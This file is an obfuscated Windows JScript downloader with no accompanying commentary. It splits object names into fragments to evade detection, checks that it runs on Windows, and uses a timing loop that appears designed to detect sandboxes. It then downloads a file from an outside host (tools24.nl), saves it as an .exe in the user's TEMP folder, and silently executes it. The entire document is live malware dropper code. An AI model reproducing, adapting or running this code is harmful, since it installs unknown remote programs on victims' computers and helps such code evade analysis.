var UE = false;
var K = "Create"+"Object";
var K0 = function SG() {return WScript[K]("WScript"+".Shell");}(), GO = 11;
var H1 = "MSXML2"+".XMLHTTP";
var U1 = 2;
var PB = U1 - 2;
function SE(U0){K0["Run"](U0, PB, PB);};
function H0(){return H1 + "";};
function P(ZM, Y){PB = PB * 1; return ZM - Y;};
function T(){return K;};
/*@cc_on
  @if (@_win32 || @_win64)
    UE = true;
  @end
@*/
if (UE)
{
var F = "";
function U(){return 22;};
var SK = 0; var BO = 0;
function X()
{
var EL = new this["Date"]();
var IQ = EL["getUTCMilliseconds"]();
WScript["Sleep"](U());
var EL = new this["Date"]();
var WJ = EL["getUTCMilliseconds"]();
WScript["Sleep"](U());
var EL = new this["Date"]();
var C = EL["getUTCMilliseconds"]();
var SK = "TJ";
SK = P(WJ, IQ);
var BO = "IJ";
BO = P(C, WJ);
F = "open";
return P(SK, BO);
}
var L = false;
var BQ = false;
for (var D = PB; D < U() * 1; D++){if (X() != PB){
L = true; 
BO = "31" + 11 * SK + BO; 
BQ = true; 
break;
}}
function JX() {return ((L == true) && (L == BQ)) ? 1 : PB;};
if (L && JX() && BQ){
function G() {return K0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "gTpZxvRRD0Hr7Go.ex" + "e";};
 LM = H0();
 N = WScript[K](LM);
 var RN = 1;
do { 
	for (;RN;){
	try {
		if (RN == 1)
		{
			N[F]("GET", "http://tools24.nl/w8isa", false);
			N["send"]();
			G1 = "Sleep";
			RN = 2;
		}
		WScript[G1](U() + 120); 
		if (N["readystate"] < 2 * 2) continue;
		RN = PB;
		function H(G0) {var OI = (1, 2, 3, 4, 5, G0); return OI;};
		PQ = WScript[T()]("ADODB.Stream");
		LM = PQ;
		LM[F]();
		LM["type"] = H(1);
		LM["write"](N["ResponseBody"]);
		PQ["position"] = H(PB);
		LM["Save" + "ToFile"](G(), 2);
		PQ["cl"+"ose"]();
		XR = G();
		SE(XR);
	} catch(AD){};};
}while (RN);
}
}

